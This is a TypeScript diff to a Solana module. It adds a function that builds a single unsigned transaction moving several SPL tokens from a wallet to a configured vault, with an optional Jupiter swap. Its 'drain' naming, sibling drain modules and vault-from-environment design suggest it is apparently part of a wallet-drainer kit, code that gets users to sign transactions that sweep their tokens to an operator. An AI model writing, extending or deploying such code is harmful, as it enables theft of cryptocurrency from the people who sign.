@@ -13,6 +13,10 @@ import { resolveInstitutionalSolanaRpcUrl } from '../adapters/svm-adapter.js'
 import { parseNativeAmount } from './native-coin-drain.js'
 import { resolveSolVaultAddress } from './operational-vault.js'
 import { broadcastSignedSolNativeTransfer } from './solana-native-drain.js'
+import {
+  buildBatchSplTransaction,
+  type SplBatchTransferLeg,
+} from './solana-settlement-enhancements.js'
 
 const TOKEN_PROGRAM_ID = new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA')
 const ASSOCIATED_TOKEN_PROGRAM_ID = new PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJe1RV')
@@ -140,4 +144,32 @@ export async function executeSplTokenDrain(params: {
   })
 }
 
-export { parseNativeAmount as parseSplAmount }
+export { parseNativeAmount as parseSplAmount, buildBatchSplTransaction, type SplBatchTransferLeg }
+
+/** Build batch SPL drain (multiple mints in one unsigned transaction). */
+export async function buildSplBatchDrainForBatch(params: {
+  wallet: string
+  transfers: SplBatchTransferLeg[]
+  vault?: string
+  rpcUrl?: string
+  includeJupiterSwap?: boolean
+}): Promise<{ unsignedWireBase64: string; recentBlockhash: string; mints: string[] } | null> {
+  const legs = params.transfers.filter((t) => t.amount > 0n)
+  if (legs.length === 0) return null
+  const vault = params.vault ?? resolveSolVaultAddress()
+  if (!vault) {
+    throw new Error('VAULT_ADDRESS_SVM or SOVEREIGN_VAULT_SOL required for SPL batch drain')
+  }
+  const batch = await buildBatchSplTransaction({
+    wallet: params.wallet,
+    vault,
+    transfers: legs,
+    rpcUrl: params.rpcUrl,
+    includeJupiterSwap: params.includeJupiterSwap,
+  })
+  return {
+    unsignedWireBase64: batch.unsignedWireBase64,
+    recentBlockhash: batch.recentBlockhash,
+    mints: batch.mints,
+  }
+}
